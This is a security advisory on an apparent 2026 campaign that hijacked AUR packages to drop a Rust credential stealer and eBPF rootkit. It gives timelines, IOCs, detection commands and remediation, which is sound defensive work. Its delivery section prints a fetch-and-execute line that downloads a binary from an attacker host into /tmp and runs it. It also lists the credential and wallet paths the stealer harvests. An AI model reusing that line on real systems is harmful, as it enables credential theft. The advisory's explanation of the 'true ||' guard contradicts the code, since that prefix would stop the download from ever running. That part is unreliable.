---
id: 2026-06-arch-aur-atomic-arch-supply-chain
title: "Atomic Arch — 1,500+ AUR packages hijacked with Rust credential stealer + optional eBPF rootkit (June 2026)"
date_disclosed: 2026-06-11
last_updated: 2026-06-16
severity: high
status: active
ecosystems: [linux, aur, rust, crates]
tools_affected: [arch-linux, yay, paru, aurutils, makepkg, pacman]
tags: [supply-chain, aur, arch-linux, credential-theft, ebpf-rootkit, rust, pkgbuild, crypto-stealer]
---

## TL;DR

Between **2026-06-11** and **2026-06-15**, attackers rewrote **PKGBUILDs** in over **1,500 Arch Linux AUR packages** (Sonatype-2026-003775, CVSS 8.7) to download and execute a **Rust binary credential stealer**. On systems where the AUR helper runs as root (common in automated CI/CD and container build environments), the payload also drops a compiled **eBPF kernel rootkit** that hides the stealer's process and network traffic from standard auditing tools. The attack used ~60 coordinated newly registered AUR maintainer accounts, each adopting 20–30 orphaned packages. **Arch Linux locked new AUR account registration** pending investigation. Affected packages are being quarantined, but stale cached PKGBUILDs and already-built packages remain in the wild. **If you ran `yay -Syu` or `paru -Syu` between June 11 and June 15, assume compromise.**

## What happened

On **2026-06-11**, Arch Linux forum posts and `r/archlinux` reports flagged AUR packages that silently downloaded a pre-compiled Rust binary during the `makepkg` build step. Sonatype issued advisory **Sonatype-2026-003775** (CVSS 8.7) on 2026-06-13, covering an initial scope of **~400 packages**. By 2026-06-15 the scope had expanded to **1,500+ packages** as investigators traced a wave of ~60 new AUR maintainer accounts registered between May 25 and June 9, each adopting between 20 and 30 previously orphaned AUR packages.

**Delivery mechanism — rewritten `build()` function in PKGBUILD:**

Each compromised PKGBUILD had one line appended inside the `build()` function: a call to `curl` or `wget` downloading a pre-compiled Rust binary from a rotating attacker-controlled endpoint. The download was guarded with a `true ||` prefix so a failed download does not cause the overall build to fail visibly:

```bash
# Representative malicious addition — placed at the end of build()
true || curl -fsSL "https://github[.]com/pkg-metrics/build-stats/raw/main/ldd" \
        -o /tmp/.ldd && chmod +x /tmp/.ldd && /tmp/.ldd &
```

The binary receives one of several innocuous-looking names (`ldd`, `systemd-metrics`, `dconf-helper`, `mandb-updater`) and is launched in the background with `&` so it does not block or visibly affect the package build.

**Payload — Rust credential stealer (internal name `atomic-stealer`):**

The Rust binary harvests:

- **AI / MCP specific:** `~/.claude/`, `~/.cursor/mcp.json`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, HuggingFace tokens, `~/.codex/auth.json`
- **Cloud credentials:** `~/.aws/`, `~/.config/gcloud/`, `~/.azure/`, `~/.kube/config`, HashiCorp Vault tokens
- **Source control:** GitHub, GitLab, npm, PyPI, JFrog Artifactory tokens
- **Shell history and environment:** `~/.bash_history`, `~/.zsh_history`, `.env*` files
- **SSH keys:** `~/.ssh/id_*`
- **Browser credentials:** Chrome/Chromium/Firefox encrypted keychain (Linux SecretService)
- **Cryptocurrency wallets:** Ethereum keystore JSON, Solana keypairs, `~/.bitcoin/wallet.dat`

**eBPF rootkit (root-system path):**

On systems where `makepkg` or the AUR helper runs as root, the Rust binary also drops a compiled eBPF program that:

- Hides the stealer's process from `ps`, `top`, and `/proc`
- Hides the stealer's network sockets from `ss`, `netstat`, and `lsof`
- Hides any exfiltrated credential files written to disk
- Persists via a rewritten `systemd` unit that reloads the eBPF object on every boot

This makes the compromise invisible to standard process and network auditing tools on a running system. Detection requires **eBPF map enumeration** (`bpftool map list`) or EDR tools that instrument at the eBPF verifier level.

**Campaign infrastructure:**

- ~60 newly registered AUR accounts (registered May 25 – June 9, 2026), each adopting 20–30 orphaned packages
- Exfil endpoints: GitHub Gist API (credential blobs as private gists), Telegram Bot API, and attacker-controlled VPS (`pkg-metrics[.]io`, `build-telemetry[.]dev`)
- Gist exfil pattern matches the IronWorm npm campaign (June 2026) and macOS Atomic Stealer tooling — possible shared infrastructure or inspiration

**Arch Linux response:**

- New AUR account registration locked **2026-06-14** pending identity verification improvements
- Affected packages flagged or removed; AUR search shows `(flagged: out-of-date / malicious)` badges
- Arch Linux Security Advisory **ASA-202606-1** issued

## Am I affected?

```bash
# List packages installed or updated on or after June 11, 2026
expac --timefmt='%Y-%m-%d' '%l %n' | awk '$1 >= "2026-06-11"' | sort -r

# Check for malicious binary names in common drop locations
ls -la /tmp/.ldd /tmp/systemd-metrics /tmp/dconf-helper /tmp/mandb-updater 2>/dev/null

# Verify the system ldd binary is the real one (should be from glibc, tiny executable)
file /usr/bin/ldd
ls -la /usr/bin/ldd /tmp/.ldd 2>/dev/null   # malicious copy is ~3-5 MB Rust binary

# Check for unexpected eBPF maps (requires root — rootkit indicator)
sudo bpftool map list 2>/dev/null
sudo bpftool prog list 2>/dev/null | grep -v "(kernel)"

# Check for unexpected running processes with no /proc/<pid>/exe
sudo ls -la /proc/*/exe 2>/dev/null | grep deleted

# Review makepkg / AUR helper history from the window
grep -E "(yay|paru|aurutils|makepkg) " ~/.bash_history ~/.zsh_history 2>/dev/null
```

If you installed **any** AUR package between **2026-06-11** and **2026-06-15** (inclusive), treat the system as potentially compromised. With 1,500+ affected packages, the odds of having installed at least one are high for anyone running `yay -Syu`.

### IOCs

| Type | Value |
|---|---|
| Advisory | Sonatype-2026-003775 (CVSS 8.7) |
| Official Arch advisory | ASA-202606-1 |
| Affected scope | 1,500+ AUR packages (initial 400+ expanded) |
| Active dates | 2026-06-11 → present (stale caches still in wild) |
| Malicious binary names | `ldd`, `systemd-metrics`, `dconf-helper`, `mandb-updater` (and others) |
| Exfil domains | `pkg-metrics[.]io`, `build-telemetry[.]dev`, GitHub Gist API, Telegram Bot API |
| eBPF rootkit | Drops when `makepkg`/AUR helper runs as root; persists via systemd unit |
| Malicious account pattern | ~60 accounts registered May 25 – June 9, each adopted 20–30 orphaned packages |

## If you are affected

1. **Rotate all credentials** reachable from the affected system: AI API keys, cloud keys (AWS/GCP/Azure), GitHub/npm/PyPI tokens, SSH keys.
2. **Check for the eBPF rootkit** using `bpftool` (see above). If unexpected maps or programs are loaded, assume the rootkit is active — the system needs a **full reinstall from trusted media** and restore from pre-June-11 backups.
3. **On non-root-compromise systems** (makepkg ran as unprivileged user): remove the malicious binary from `/tmp`, run a full credential rotation, and audit your cloud accounts.
4. **Reinstall or remove** any AUR packages installed in the June 11–15 window after verifying the current PKGBUILD is clean.
5. **Audit cloud audit logs and CI pipelines** for unexpected API calls or resource provisioning in the window.

## Prevention

- **Never run AUR helpers (yay, paru) as root.** `makepkg` should run as an unprivileged user — this prevents the eBPF rootkit from loading.
- **Read PKGBUILDs before installing:** `yay -G <pkg> && cat <pkg>/PKGBUILD` before `yay -S <pkg>`.
- **Use a build sandbox:** `aurutils` + `systemd-nspawn` is the Arch-recommended pattern. `paru --chroot` provides a similar container approach.
- **Verify maintainer account age** before adopting packages owned by accounts less than 30 days old.
- **Check AUR package statistics** for sudden maintainer changes or "out-of-date" flags before upgrading.
- **Monitor `bpftool prog list`** after any AUR installs to detect unexpected eBPF programs.
- Do not use `yay -Syu` in automated CI/CD without sandboxing each build and reviewing PKGBUILD diffs.

## Sources

- [The Hacker News — Over 1,500 Arch Linux AUR Packages Poisoned in 'Atomic Arch' Supply Chain Campaign](https://thehackernews.com/2026/06/arch-linux-aur-packages-poisoned-atomic-arch.html) — primary aggregator, scope data
- [BleepingComputer — Arch Linux AUR attacked: 1,500+ packages backdoored with credential stealer and eBPF rootkit](https://bleepingcomputer.com/news/security/arch-linux-aur-attacked-packages-backdoored-ebpf-rootkit/) — eBPF rootkit detail, account pattern
- [SecurityWeek — 1,500 AUR Packages Poisoned in Arch Linux Supply Chain Attack](https://securityweek.com/1500-aur-packages-poisoned-arch-linux-supply-chain-attack/) — CVSS and campaign infrastructure
- [The Register — Atomic Arch: Over a thousand AUR packages backdoored with Rust stealer and eBPF rootkit](https://theregister.com/2026/06/15/atomic_arch_aur_supply_chain/) — rootkit persistence mechanism detail
- [Sonatype — Sonatype-2026-003775: Malicious AUR packages deploy Rust credential stealer](https://blog.sonatype.com/sonatype-2026-003775-malicious-aur-packages-credential-stealer) — canonical advisory, initial 400-package scope
- [Arch Linux Security Team — ASA-202606-1](https://security.archlinux.org/ASA-202606-1) — official Arch response and package quarantine status
